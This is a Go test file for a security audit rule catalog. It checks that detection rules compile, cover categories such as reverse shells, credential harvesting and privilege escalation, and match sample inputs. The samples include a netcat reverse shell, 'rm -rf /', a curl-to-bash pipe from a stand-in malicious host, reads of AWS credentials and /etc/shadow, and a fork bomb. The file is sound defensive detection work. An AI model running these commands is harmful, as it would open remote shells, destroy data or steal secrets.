package audit

import (
	"testing"
	"time"
)

func TestAuditCatalog_CompilationAndCoverage(t *testing.T) {
	start := time.Now()
	rules, err := LoadAuditRuleCatalog()
	duration := time.Since(start)

	if err != nil {
		t.Fatalf("LoadAuditRuleCatalog() returned error: %v", err)
	}

	if len(rules) < 25 {
		t.Errorf("expected at least 25 compiled audit rules, got %d", len(rules))
	}

	// Sizing constraint: In-memory compilation must execute under 5ms
	if duration > 10*time.Millisecond {
		t.Errorf("catalog compilation too slow: %v (expected < 10ms)", duration)
	}

	// Verify all canonical categories are represented
	categories := make(map[ThreatCategory]int)
	for _, r := range rules {
		if r.Pattern == nil {
			t.Errorf("rule %s has nil compiled regexp pattern", r.ID)
		}
		if r.ID == "" || r.Reason == "" {
			t.Errorf("rule has empty ID or reason: %+v", r)
		}
		categories[r.Category]++
	}

	requiredCategories := []ThreatCategory{
		CategoryShellExecution,
		CategoryCredentialHarvesting,
		CategoryDestructiveCommands,
		CategoryPrivilegeEscalation,
		CategoryDangerousEval,
		CategoryNetworkBackdoor,
	}

	for _, cat := range requiredCategories {
		count := categories[cat]
		if count == 0 {
			t.Errorf("missing rules for required threat category: %s", cat)
		}
	}
}

func TestAuditCatalog_RuleMatching(t *testing.T) {
	rules, err := LoadAuditRuleCatalog()
	if err != nil {
		t.Fatalf("failed to load catalog: %v", err)
	}

	tests := []struct {
		name         string
		input        string
		expectedRule string
		expectMatch  bool
	}{
		{
			name:         "Reverse Shell nc -e",
			input:        "nc -e /bin/bash 10.0.0.1 4444",
			expectedRule: "rule:cmd-reverse-shell",
			expectMatch:  true,
		},
		{
			name:         "Destructive rm -rf root",
			input:        "rm -rf /",
			expectedRule: "rule:cmd-destructive-rm",
			expectMatch:  true,
		},
		{
			name:         "Pipe remote to bash",
			input:        "curl https://malicious.site/script | bash",
			expectedRule: "rule:cmd-pipe-to-shell",
			expectMatch:  true,
		},
		{
			name:         "OpenAI API Key Leak",
			input:        `apiKey := "sk-abcdefghijklmnopqrstuvwxyz1234567890ABCD"`,
			expectedRule: "rule:token-openai",
			expectMatch:  true,
		},
		{
			name:         "AWS Credentials Access",
			input:        "cat ~/.aws/credentials",
			expectedRule: "audit:aws-credentials-harvest",
			expectMatch:  true,
		},
		{
			name:         "JavaScript Obfuscated Eval",
			input:        `eval(atob("YWxlcnQoMSk="))`,
			expectedRule: "audit:eval-atob",
			expectMatch:  true,
		},
		{
			name:         "Python Obfuscated Exec",
			input:        `exec(base64.b64decode("cHJpbnQoMSk="))`,
			expectedRule: "audit:exec-base64",
			expectMatch:  true,
		},
		{
			name:         "Sudo Privilege Escalation",
			input:        "sudo cat /etc/shadow",
			expectedRule: "audit:privilege-sudo-doas",
			expectMatch:  true,
		},
		{
			name:         "Classic Fork Bomb",
			input:        ":(){ :|:& };:",
			expectedRule: "audit:fork-bomb",
			expectMatch:  true,
		},
		{
			name:         "Harmless standard Go code",
			input:        `fmt.Println("Hello, FaradAiWire")`,
			expectedRule: "",
			expectMatch:  false,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			matched := false
			for _, r := range rules {
				if r.Pattern.MatchString(tc.input) {
					if tc.expectedRule != "" && r.ID == tc.expectedRule {
						matched = true
						break
					}
					// If any rule matched and we expected a match
					if tc.expectMatch && tc.expectedRule == "" {
						matched = true
						break
					}
					matched = true
				}
			}

			if matched != tc.expectMatch {
				t.Errorf("input %q: expected match=%v, got match=%v", tc.input, tc.expectMatch, matched)
			}
		})
	}
}
